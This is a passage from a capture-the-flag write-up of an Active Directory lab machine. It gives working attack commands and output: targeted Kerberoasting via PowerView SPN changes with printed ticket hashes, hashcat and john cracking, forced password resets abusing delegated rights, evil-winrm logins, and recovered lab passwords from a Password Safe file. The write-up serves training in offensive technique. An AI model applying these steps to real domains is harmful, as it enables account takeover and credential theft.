+</span></span><span class="line"><span class="cl">WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW<span class="o">(</span>Clock skew too great<span class="o">)</span>
+</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc.administrator.htb
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains in the forest
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> computers
+</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc.administrator.htb
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">11</span> users
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">53</span> groups
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">2</span> gpos
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> ous
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">19</span> containers
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">0</span> trusts
+</span></span><span class="line"><span class="cl">INFO: Starting computer enumeration with <span class="m">10</span> workers
+</span></span><span class="line"><span class="cl">INFO: Querying computer: dc.administrator.htb
+</span></span><span class="line"><span class="cl">WARNING: Connection timed out <span class="k">while</span> resolving sids
+</span></span><span class="line"><span class="cl">INFO: Done in 00M 39S
+</span></span></code></pre></div><p>Looking at the results in the BloodHound GUI, we can see that <code>olivia</code> has GenericAll permissions over the <code>michael</code> user.
+<img loading="lazy" src="/img/administrator/1.png">
+<code>michael</code>, in his turn, has ForceChangePassword rights over <code>benjamin</code>.
+<img loading="lazy" src="/img/administrator/2.png">
+And <code>benjamin</code> turns out to be a part of the Share Moderators group, which is a custom group that none of the above users are a part of!
+<img loading="lazy" src="/img/administrator/3.png"></p>
+<p>Let&rsquo;s get to work on our privilege escalation now. First of all, our current GenericAll permissions over <code>michael</code> can allow us to take over their account. Let&rsquo;s try doing this in a less invasive manner first &ndash; by performing a targeted Kerberoast.</p>
+<h2 id="michael---targeted-kerberoast"><code>michael</code> - Targeted Kerberoast</h2>
+<p>We can read some instructions on how to perform this attack from the BloodHound GUI:
+<img loading="lazy" src="/img/administrator/4.png"></p>
+<ul>
+<li>We&rsquo;ll need to upload PowerView via WinRM and import it in order for us to use the <code>Set-DomainObject</code> cmdlet.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$SecPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;ichliebedich&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span><span class="p">(</span><span class="s1">&#39;ADMINISTRATOR\olivia&#39;</span><span class="p">,</span> <span class="nv">$SecPassword</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-DomainObject</span> <span class="n">-Credential</span> <span class="nv">$Cred</span> <span class="n">-identity</span> <span class="n">michael</span> <span class="n">-SET</span> <span class="vm">@</span><span class="p">{</span><span class="n">serviceprincipalname</span><span class="p">=</span><span class="s1">&#39;notahacker/LEGIT&#39;</span><span class="p">}</span> <span class="n">-Verbose</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainSPNTicket</span> <span class="n">-Credential</span> <span class="nv">$Cred</span> <span class="n">-SPN</span> <span class="s1">&#39;notahacker/LEGIT&#39;</span> <span class="p">|</span> <span class="nb">fl
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Warning</span><span class="err">:</span> <span class="p">[</span><span class="nb">Invoke-UserImpersonation</span><span class="p">]</span> <span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">is</span> <span class="n">not</span> <span class="n">currently</span> <span class="k">in</span> <span class="n">a</span> <span class="nb">single-threaded</span> <span class="n">apartment</span> <span class="n">state</span><span class="p">,</span> <span class="n">token</span> <span class="n">impersonation</span> <span class="n">may</span> <span class="n">not</span> <span class="n">work</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Warning</span><span class="err">:</span> <span class="p">[</span><span class="nb">Invoke-UserImpersonation</span><span class="p">]</span> <span class="n">Executing</span> <span class="n">LogonUser</span><span class="p">()</span> <span class="n">with</span> <span class="n">user</span><span class="err">:</span> <span class="n">administrator</span><span class="p">\</span><span class="n">olivia</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">SamAccountName</span>       <span class="err">:</span> <span class="n">UNKNOWN</span>
+</span></span><span class="line"><span class="cl"><span class="n">DistinguishedName</span>    <span class="err">:</span> <span class="n">UNKNOWN</span>
+</span></span><span class="line"><span class="cl"><span class="n">ServicePrincipalName</span> <span class="err">:</span> <span class="n">notahacker</span><span class="p">/</span><span class="n">LEGIT</span>
+</span></span><span class="line"><span class="cl"><span class="n">TicketByteHexStream</span>  <span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">Hash</span>                 <span class="err">:</span> <span class="nv">$krb5tgs$23</span><span class="p">$*</span><span class="n">UNKNOWN</span><span class="nv">$UNKNOWN$notahacker</span><span class="p">/</span><span class="n">LEGIT</span><span class="p">*</span><span class="nv">$FF02B1641221504DC9EF6714DA0DDF38$39C65EA42AEC086BBB8D74F5D8BCEEE9DC28B53EB41288BA93196A266F7FDEF183C6297903CA6A9F942D2F0B8300018F6CA1F8A91548DC9A4FB44DE5CB674905DD3EFA53B21D49CCFAAD019A91EB0CE5A5F12428D87288DECAEA828E5BB0CF2B029F44BABE00F2F0A4C205CECDD107B33226DABC05B64EB3D5C6FE4AB2E1A76F82ACF89F17CB5B201C91CF1D4C44BF39AA8CD2CFAD321BDF328A3FA806A68CEE1142199599EC6A9A39FEBF25AD2D0A3FAEFFF026C59EF94545CA9689A77642E93FE8D53B2A29961CE12AD27C4DFB34E3EAC07FCD39E986BDE8309B8198D9A31CC504BC5121164F5A8AEE07E7482FD9A7BBB1BB60731F1185103693710FFDA8F8947DC45ACC86F64F5E26ACE660C1DF85C28278201105927EA55A9D1ACE59A3296631C8524FEF0D56F50205C875156B89CA91AD350EB5B6A77A32669D5A477280D3FBD21BBFC55321A141E2438C17122FD65748EECBB8BB83E38D78943F9813EBF7B21D94DB9D288D37639AB0BED4A6CC7B0A62EAA3C8B1A5E723680CBAD3C37587F626E64FEB9AA27D68127648382A9DF22C09DCB957667A956D20E333E9D26C291D39CB85C8DFFA046FF8AF519F20C670C6E95AEEC0A099CD2DA24A53F5421807B6E0F292E095B5A961E643F01D783DCADF4C2C0D485D238C995FE7AED54D8FBC6077EC49BA9007C261202158A642E32D87B8EA844786D019E55A2D410899B5D9153463507A458200CF4237028A0A8E6803EF3ACF800F6D62E65024A7A5D7EA17D8A9130E59F0364348D023BC38D5F5DE2D6B39926941A4D4E352D833E1D32B9FBEA0FC96E0B3D8EFF12F3D42F576AE419BDCD3A7D7CF9E29496D5AF946600DC9CE86AD5953BEEF8FF587B5F827584941F728BC8CE041F59682CDB3E5ACC876449BA82D2D15184FFB8EE1FD0C2208D844778340ECEC18C9783957F4FF9E23748197944E9425B5EC4B5CACDFBB18AEC8701A19D0C176775E3E5C9C69EC2CB18BB6C85E19744E7207C92BA4C7CAEE2209BBB3636BE1F5620CEF9EC6A897CE3CF8CE5602B3720B9D05BC15E832E9EA33D4C8897745280FCA987EE40F39F6FA113FE459E7D3E45F096D6DA2CA6B858B8C9BE68067F9F9CC4F8C9A2D4EE366716946E3EFCC60B0F7CB1F0D61F73A46BF65D6A45D9610D62D423A6F1B1E06ED6FFA7F2FBC997950975689C2D40885646BC6BE4C85DCC11907E84CE4F86A4A9B54417B02598F918681B4C81B08D22534E0330393F4DE5DE4C1F7590D4591A04BFF4D1414228FF2EAB7708A58C6A22275F041D44AB3DDC25451F64A67C4AFADE2D98EC435FD6CD4E75F1519956A177574938A3059350305D83EE5C4F314B88D86ABB03B5697268601DDCB29FF12D2D9EB16DF1EC3EB7D53FE1D7B70AE21742D605B21CF7367255228C1FFD1E85E8B4472DD018732F46248328C5EC6F11C3258C117CDD021AD04DCBA47CBB3D4D21E82BD0E85BECF310F0E7C6F3FEF80FD5AEB1D1B34BF87438D91F9CABF10424D08EA99BF323A74F52D17EE92760DAB66A81C8CD4BA8C2E5948AA31157A4F0225D2CF742F1A6A55F0907EE977E5F703B3F8371CDAF50045B4F9D6E617539DB330A961B673BB0716638AF19ADEDF392D0188430EBD3A71222F1E38BF87D6B57B53B7DF7156F75CB22EA1957D7D49AF9609A6B376FD0B4016A46385FA453E85683B84E3BEF43194DDB1</span>
+</span></span></code></pre></div><p>Now I&rsquo;ll paste this hash into a text file and try to crack it with Hashcat.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">hashcat -a <span class="m">0</span> -m <span class="m">13100</span> michael-spn-ticket-hash /usr/share/wordlists/rockyou.txt -O
+</span></span></code></pre></div><p>Unfortunately, attempting to crack this hash with Hashcat with the rockyou wordlist doesn&rsquo;t result in success, so we have to try a different method.</p>
+<h2 id="changing-password-of-michael">Changing Password of <code>michael</code></h2>
+<p><code>olivia</code>&rsquo;s GenericAll rights over <code>michael</code> gives them the ability to change their password without knowing it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$secpassword</span> <span class="p">=</span> <span class="nb">convertto-securestring</span> <span class="s1">&#39;ichliebedich&#39;</span> <span class="n">-asplaintext</span> <span class="n">-force</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">system</span><span class="p">.</span><span class="py">management</span><span class="p">.</span><span class="py">automation</span><span class="p">.</span><span class="py">pscredential</span><span class="p">(</span><span class="s1">&#39;administrator\olivia&#39;</span><span class="p">,</span> <span class="nv">$secpassword</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$newmichaelpass</span> <span class="p">=</span> <span class="nb">convertto-securestring</span> <span class="s1">&#39;Passw0rd123!!&#39;</span> <span class="n">-asplaintext</span> <span class="n">-force</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set-domainuserpassword</span> <span class="n">-identity</span> <span class="n">michael</span> <span class="n">-accountpassword</span> <span class="nv">$newmichaelpass</span> <span class="n">-credential</span> <span class="nv">$cred</span> <span class="n">-verbose</span>
+</span></span><span class="line"><span class="cl"><span class="n">Verbose</span><span class="err">:</span> <span class="p">[</span><span class="nb">Get-PrincipalContext</span><span class="p">]</span> <span class="n">Using</span> <span class="n">alternate</span> <span class="n">credentials</span>
+</span></span><span class="line"><span class="cl"><span class="n">Verbose</span><span class="err">:</span> <span class="p">[</span><span class="nb">Set-DomainUserPassword</span><span class="p">]</span> <span class="n">Attempting</span> <span class="n">to</span> <span class="nb">set </span><span class="n">the</span> <span class="n">password</span> <span class="k">for</span> <span class="n">user</span> <span class="s1">&#39;michael&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Verbose</span><span class="err">:</span> <span class="p">[</span><span class="nb">Set-DomainUserPassword</span><span class="p">]</span> <span class="n">Password</span> <span class="k">for</span> <span class="n">user</span> <span class="s1">&#39;michael&#39;</span> <span class="n">successfully</span> <span class="n">reset</span>
+</span></span></code></pre></div><p>We can see in BloodHound that <code>michael</code> is also a part of the Remote Management Users group, so we can use WinRM to authenticate as them.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">evil-winrm -i 10.129.20.250 -u <span class="s1">&#39;michael&#39;</span> -p <span class="s1">&#39;Passw0rd123!!&#39;</span>
+</span></span></code></pre></div><p>I&rsquo;m not going to run BloodHound as <code>michael</code> yet, but I might come back to this later if it&rsquo;s going to seem like we don&rsquo;t have enough attack surface.
+<code>michael</code>&rsquo;s privileges (<code>whoami /priv</code>) and groups (<code>whoami /groups</code>) are identical to those of <code>olivia</code>.</p>
+<p>I have also found the <code>inetpub</code> folder in the <code>C:\</code> drive, but the access to all the folders inside it, apart from <code>custerr</code> (which doesn&rsquo;t have anything useful), is denied.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">Mode</span>                 <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+</span></span><span class="line"><span class="cl"><span class="p">----</span>                 <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">-----</span>        <span class="mf">10</span><span class="p">/</span><span class="mf">29</span><span class="p">/</span><span class="mf">2024</span>   <span class="mf">1</span><span class="err">:</span><span class="mf">05</span> <span class="n">PM</span>                <span class="n">custerr</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">-----</span>         <span class="mf">10</span><span class="p">/</span><span class="mf">5</span><span class="p">/</span><span class="mf">2024</span>   <span class="mf">7</span><span class="err">:</span><span class="mf">14</span> <span class="n">PM</span>                <span class="n">ftproot</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">-----</span>         <span class="mf">11</span><span class="p">/</span><span class="mf">1</span><span class="p">/</span><span class="mf">2024</span>   <span class="mf">1</span><span class="err">:</span><span class="mf">27</span> <span class="n">PM</span>                <span class="nb">history
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">d</span><span class="p">-----</span>         <span class="mf">10</span><span class="p">/</span><span class="mf">5</span><span class="p">/</span><span class="mf">2024</span>   <span class="mf">9</span><span class="err">:</span><span class="mf">59</span> <span class="n">AM</span>                <span class="n">logs</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">-----</span>         <span class="mf">10</span><span class="p">/</span><span class="mf">5</span><span class="p">/</span><span class="mf">2024</span>   <span class="mf">9</span><span class="err">:</span><span class="mf">59</span> <span class="n">AM</span>                <span class="n">temp</span>
+</span></span></code></pre></div><h2 id="forcechangepassword-abuse---michael-to-benjamin">ForceChangePassword Abuse - <code>michael</code> to <code>benjamin</code></h2>
+<p>Let&rsquo;s now try to abuse <code>michael</code>&rsquo;s ForceChangePassword right over <code>benjamin</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$secpassword</span> <span class="p">=</span> <span class="nb">convertto-securestring</span> <span class="s1">&#39;Passw0rd123!!&#39;</span> <span class="n">-asplaintext</span> <span class="n">-force</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">system</span><span class="p">.</span><span class="py">management</span><span class="p">.</span><span class="py">automation</span><span class="p">.</span><span class="py">pscredential</span><span class="p">(</span><span class="s1">&#39;administrator\michael&#39;</span><span class="p">,</span> <span class="nv">$secpassword</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$newbenjaminpass</span> <span class="p">=</span> <span class="nb">convertto-securestring</span> <span class="s1">&#39;Passw0rd1234!!&#39;</span> <span class="n">-asplaintext</span> <span class="n">-force</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set-domainuserpassword</span> <span class="n">-identity</span> <span class="n">benjamin</span> <span class="n">-accountpassword</span> <span class="nv">$newbenjaminpass</span> <span class="n">-credential</span> <span class="nv">$cred</span> <span class="n">-verbose</span>
+</span></span></code></pre></div><p>The password change is successful, but unfortunately, <code>benjamin</code> is not a part of the Remote Management Users group, so we can&rsquo;t authenticate via WinRM here, but we still have FTP and SMB to check.
+We can successfully log in as <code>benjamin</code> into FTP.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ftp benjamin@administrator.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Connected to administrator.htb.
+</span></span><span class="line"><span class="cl"><span class="m">220</span> Microsoft FTP Service
+</span></span><span class="line"><span class="cl"><span class="m">331</span> Password required
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl"><span class="m">230</span> User logged in.
+</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is Windows_NT.
+</span></span></code></pre></div><p>&hellip;And SMB. But <code>benjamin</code> doesn&rsquo;t have any new SMB permissions compared to <code>olivia</code>, so let&rsquo;s look at FTP first.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">crackmapexec smb 10.129.20.250 -u <span class="s1">&#39;benjamin&#39;</span> -p <span class="s1">&#39;Passw0rd1234!!&#39;</span> --shares
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:administrator.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> administrator.htb<span class="se">\b</span>enjamin:Passw0rd1234!! 
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               C$                              Default share
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               NETLOGON        READ            Logon server share 
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               SYSVOL          READ            Logon server share 
+</span></span></code></pre></div><p>I&rsquo;m not going to run BloodHound as benjamin yet, but might come back to do this if it will seem like we don&rsquo;t have enough attack surface.</p>
+<p>On the FTP server, we can find a file named <code>Backup.psafe3</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ftp&gt; ls
+</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>63123<span class="p">|</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="m">125</span> Data connection already open<span class="p">;</span> Transfer starting.
+</span></span><span class="line"><span class="cl">10-05-24  09:13AM                  <span class="m">952</span> Backup.psafe3                                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.                                                                                                                                                                  
+</span></span><span class="line"><span class="cl">ftp&gt; get Backup.psafe3
+</span></span><span class="line"><span class="cl">local: Backup.psafe3 remote: Backup.psafe3                                                                                                                                              
+</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>63126<span class="p">|</span><span class="o">)</span>                                                                                                                                          
+</span></span><span class="line"><span class="cl"><span class="m">125</span> Data connection already open<span class="p">;</span> Transfer starting.                                                                                                                                    
+</span></span><span class="line"><span class="cl">100% <span class="p">|</span>*******************************************************************************************************************************************<span class="p">|</span>   <span class="m">952</span>        3.42 KiB/s    00:00 ETA
+</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
+</span></span><span class="line"><span class="cl">WARNING! <span class="m">3</span> bare linefeeds received in ASCII mode.
+</span></span><span class="line"><span class="cl">File may not have transferred correctly.
+</span></span><span class="line"><span class="cl"><span class="m">952</span> bytes received in 00:00 <span class="o">(</span>2.09 KiB/s<span class="o">)</span>
+</span></span></code></pre></div><p>We get a warning: &ldquo;3 bare linefeeds received in ASCII mode&rdquo;. This indicates that the file is binary and may not have been downloaded correctly. To fix that, we can switch to binary mode by running <code>binary</code>, and then <code>get</code>ting the file again.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ftp&gt; binary
+</span></span><span class="line"><span class="cl"><span class="m">200</span> Type <span class="nb">set</span> to I.
+</span></span><span class="line"><span class="cl">ftp&gt; get Backup.psafe3
+</span></span><span class="line"><span class="cl">local: Backup.psafe3 remote: Backup.psafe3
+</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>56316<span class="p">|</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="m">125</span> Data connection already open<span class="p">;</span> Transfer starting.
+</span></span><span class="line"><span class="cl">100% <span class="p">|</span>*******************************************************************************************************************************************<span class="p">|</span>   <span class="m">952</span>        3.03 KiB/s    00:00 ETA
+</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
+</span></span><span class="line"><span class="cl"><span class="m">952</span> bytes received in 00:00 <span class="o">(</span>2.13 KiB/s<span class="o">)</span>
+</span></span></code></pre></div><h2 id="the-user-password-database">The User Password Database</h2>
+<p>.psafe3 is an extension for the Password Safe V3 databases.
+Upon trying to read it with <code>pwsafe -r Backup.psafe3</code>, we find out that the database requires a password.
+<img loading="lazy" src="/img/administrator/5.png"></p>
+<p>To get a hash-cracker-friendly hash for Backup.psafe3, we can use <code>pwsafe2john</code>. Then, we can crack the hash using John the Ripper.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwsafe2john Backup.psafe3 &gt; pwsafe-hash
+</span></span><span class="line"><span class="cl">john --format<span class="o">=</span>pwsafe --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt pwsafe-hash
+</span></span></code></pre></div><p>The password turns out to be <code>tekieromucho</code>.
+Inside the database, there are 3 users. We can double-click on their respective entry in order to get that user&rsquo;s password.
+<img loading="lazy" src="/img/administrator/6.png">
+The passwords are:</p>
+<ul>
+<li><code>alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw</code></li>
+<li><code>emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb</code></li>
+<li><code>emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur</code></li>
+</ul>
+<p>Let&rsquo;s look at the new users in BloodHound. They all seem to have no interesting/new privileges apart from <code>emily</code>, who has a GenericWrite right over the <code>ethan</code> user.
+<img loading="lazy" src="/img/administrator/7.png"></p>
+<p>Out of the new 3 users, <code>emily</code> is also the only one that&rsquo;s in the Remote Management Users group, so let&rsquo;s also try to log into their account with WinRM.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">evil-winrm -i 10.129.20.250 -u <span class="s1">&#39;emily&#39;</span> -p <span class="s1">&#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39;</span>
+</span></span></code></pre></div><p>We get access as <code>emily</code> as well as the user flag!</p>
+<h1 id="root">Root</h1>
+<p>The GenericWrite access grants you the ability to write to any non-protected attribute on the target object, including <code>members</code> for a group, and <code>serviceprincipalnames</code> for a user. So after all, it seems like we&rsquo;ll need to add an SPN to <code>ethan</code> instead of <code>michael</code> :)
+For a targeted Kerberoast attack, we can just follow the steps we did above for <code>michael</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$SecPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span><span class="p">(</span><span class="s1">&#39;ADMINISTRATOR\emily&#39;</span><span class="p">,</span> <span class="nv">$SecPassword</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-DomainObject</span> <span class="n">-Credential</span> <span class="nv">$Cred</span> <span class="n">-identity</span> <span class="n">ethan</span> <span class="n">-SET</span> <span class="vm">@</span><span class="p">{</span><span class="n">serviceprincipalname</span><span class="p">=</span><span class="s1">&#39;stillnotahacker/EXTRALEGIT&#39;</span><span class="p">}</span> <span class="n">-Verbose</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainSPNTicket</span> <span class="n">-Credential</span> <span class="nv">$Cred</span> <span class="n">-SPN</span> <span class="s1">&#39;stillnotahacker/EXTRALEGIT&#39;</span> <span class="p">|</span> <span class="nb">fl
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">SamAccountName</span>       <span class="err">:</span> <span class="n">UNKNOWN</span>
+</span></span><span class="line"><span class="cl"><span class="n">DistinguishedName</span>    <span class="err">:</span> <span class="n">UNKNOWN</span>
+</span></span><span class="line"><span class="cl"><span class="n">ServicePrincipalName</span> <span class="err">:</span> <span class="n">stillnotahacker</span><span class="p">/</span><span class="n">EXTRALEGIT</span>
+</span></span><span class="line"><span class="cl"><span class="n">TicketByteHexStream</span>  <span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">Hash</span>                 <span class="err">:</span> <span class="nv">$krb5tgs$23</span><span class="p">$*</span><span class="n">UNKNOWN</span><span class="nv">$UNKNOWN$stillnotahacker</span><span class="p">/</span><span class="n">EXTRALEGIT</span><span class="p">*</span><span class="nv">$ABFC62AFF21E8646A78FE7728D6ECA0C$1ADDF2305B753FFA44BFC5CF9DB605E720DFB862341BEABE188E87A293EFF73BA851E72A74A6938ED7049286AB5988E27CAA60C81FC2FAFABC5874CC6735C7D37FA9E7507F7213B0088BBA995E07FFC0013D6B15DE2354051BBA883DF035483795AD83695379FD22B8BF019A241E019228888152AAE0442FEF43B7BEDA6D2D55806284B2152BB32E8F1D3666495D56C036C4E61D675C94D8085E979BA4B96F319730F5BED8EC9B505220BEA78B889CAF3D07D4D734807FE9CC907EC0E058CAE2121DFF778BCB754C566AAC274D05896FD1E34265AC2892B37C9A7FC3474917FCF8C91E7113172F63AB9C802A90D029A22BF85A69A8205CC54DB0A2612A2B98E3D97C7E58E5188E67616455EF83CA77DF0FD46F3D41EA0AE574826D5A1EC5D538B2F82F1309A932CCCE630010F12C66460BD58D8A2D94DD2122E7D39E0534484B1F24B98C7BD3E65B3025B193394052AF1C01F5163E6DBCED0E84108F33922529254B0C3777DC8D844E49C5EE3895BC49904B139284B996A35A111487B7C92497F41B75BB25D07177194BB5A8E43B34173A240E97236FF7A944D08C3FFED3BA8900A58FE499585007B87E66EAC4C630AE02304BCCE3B182FD27A44074FC16B444DA1D75A17465099AAEDD45434D99AD3C6AD2ECF57B9FEBFEEEFD171F67E7A0DF3122665D0ABDDC42B165D05EB6D7056F677602297649F945733F8CCAB74EA504C5A5D7763BE2468532009E7584406274762682D769F99E4450C2CFFC01264F836BDAEC21AFD17D7E451F3F349CD1DEB8AE1761574672597435F411048A2F30529AC3CE851B0E8A54BBB632997BB59A5AD3AC43000B949459A8AC492B3D3843AE1819BBE609B83CABEBC5F3A7078BFC5E87510374A7DED61824E31EDA9820D71BAEB2798D8F65AF1C3DEDD5815260F979969BB122103BFAB895BC77CF647241B5422CB39BC083153AB1385779D56B4C7A8D9F680E99DE0A634D1A50E7942304CE5C23472D84C67773130D96105BF9DB2A400FB4C8EEC9E700CB08F59B3BEEE303ECA5468E297CCD2AD6CC4A8D5C419F43CB50327AEE899C6B9452FB166C2371D0F6AA8E70BCCEC550DC7D248DADE6CF47DA04019B3C57A3FB907D981730A60421A7C76F38C57C2B7BB9F50272955FE47A96D2149D11B792E2941AF29BCBBC81D52C5E4F63F856AA1D27430D68615927D79A1D1BFD6CBDB9A65DECE447E67037CC468BA5C4365AD29B6BAF5E63BFFDA51F6BB120CDDCCFEFBB85E2252CCDDAE08738DB3F63B191481A2D71C6E9342ED81D5F31D79DB82F49C8D7F43B3C14B264CDFF7C218368619FE8C797D9DD48D834EC5F010B69950DCAB58924ADE229548531C8013F691DFE0484A7345943E5AB6336CAD83EC87F3ED27B7399CD42A74EE2D243156DC97277D9D75FC06E288B0DD8BDF8AEE1DF31DB7DFA078BD2DC91F2BF4F09BD5BF0EAAC47A76B812459DD7BFF84E8C7B64BC2BCFA9921C9057A9009D366F8FF071EF48B077AD949A7A40A0EBFD1B137E4527DCB9F014D84D96AA0F590C6EC9795DD30D8D5DD94C02B4B625BC7EAEC4C64AF4BDC91CCC780A8E19366B1FE29F14E3653A917710BC88D7E388486E3DB4F161FFE0E36F79386C0DFC5C1721B6F86E0A196498CAA8032C36B5E3211E3030C4AB4125D5E1D76F41002C0F68AF85718EC52F5044DADB3BE2AF41FF6C5B6756774014476CA4B7E</span>
